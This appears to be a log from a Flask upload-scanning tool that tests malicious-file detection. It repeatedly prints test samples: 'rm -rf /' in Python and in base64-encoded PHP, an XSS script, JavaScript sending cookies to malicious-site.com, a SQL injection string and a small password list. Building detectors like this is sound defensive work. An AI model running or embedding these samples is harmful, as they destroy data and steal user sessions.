# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:26,782 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:26,783 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,784 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,785 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,786 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,787 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,788 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:26,794 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,795 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,796 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,797 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,798 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,799 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,800 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,801 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:26,802 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,804 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:26,805 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,806 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,807 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,808 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,809 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,811 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,812 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:26,813 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,814 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:26,815 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,816 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,818 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,819 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,820 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,821 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,822 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:26,824 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,825 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:26,826 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,828 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,829 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,830 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,831 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,833 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,834 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:26,835 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,837 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:26,838 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,839 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,841 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,842 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,843 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,844 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,845 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:26,847 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,848 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:26,850 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,855 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:31:26,855 - [33mPress CTRL+C to quit[0m
2025-02-22 20:31:30,071 - 127.0.0.1 - - [22/Feb/2025 20:31:30] "GET / HTTP/1.1" 200 -
2025-02-22 20:31:34,801 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-22 20:31:34,801 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py
2025-02-22 20:31:34,801 - Moved create_malicious_xlsx.py to trash due to suspicious content.
2025-02-22 20:31:34,803 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:34,805 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/app.py: from flask import Flask, render_template, request, redirect, url_for, flash
import os
import sqlite3
import re
import logging
import zipfile
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['TRASH_FOLDER'] = 'trash'
app.config['ALLOWED_EXTENSIONS'] = {"docx", "xls", "xlsx", "ppt", "pptx", "odt", "txt", "py", "js", "c", "java", "zip", "r", "bsv", "yaml", "xml", "word", "xl", "xss", 
2025-02-22 20:31:34,805 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/app.py
2025-02-22 20:31:34,805 - Moved app.py to trash due to suspicious content.
2025-02-22 20:31:34,806 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/create_malicious_pptx.py: from pptx import Presentation

def create_malicious_pptx(filename):
    # Create a new Presentation
    ppt = Presentation()
    
    # Add a slide
    slide = ppt.slides.add_slide(ppt.slide_layouts[5])  # Title Slide layout
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "<script>alert('XSS');</script>",
        "eval('some malicious code');"
    ]
    
    for line in suspicious_content:

2025-02-22 20:31:34,806 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/create_malicious_pptx.py
2025-02-22 20:31:34,806 - Moved create_malicious_pptx.py to trash due to suspicious content.
2025-02-22 20:31:34,811 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 20:31:34,811 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/malicious.xlsx
2025-02-22 20:31:34,811 - Moved malicious.xlsx to trash due to suspicious content.
2025-02-22 20:31:34,817 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 20:31:34,817 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/malicious.pptx
2025-02-22 20:31:34,817 - Moved malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:34,818 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:34,820 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:34,822 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:34,824 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:34,833 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-22 20:31:34,833 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/test_doc_hidden.docx
2025-02-22 20:31:34,833 - Moved test_doc_hidden.docx to trash due to suspicious content.
2025-02-22 20:31:34,835 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:34,843 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:34,854 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:31:34,854 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:34,855 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:34,856 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:31:34,856 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/trash/1.sql
2025-02-22 20:31:34,856 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:31:34,857 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:34,858 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:34,859 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:34,866 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:34,867 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:34,869 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:34,872 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:34,874 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:34,877 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:34,878 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:34,879 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:34,884 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:34,892 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:31:34,892 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:34,893 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:34,894 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:34,895 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:34,896 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:34,902 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:34,903 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:34,909 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:31:34,916 - Embedded object detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:31:34,916 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:31:34,918 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:34,920 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:34,921 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:34,924 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:34,925 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

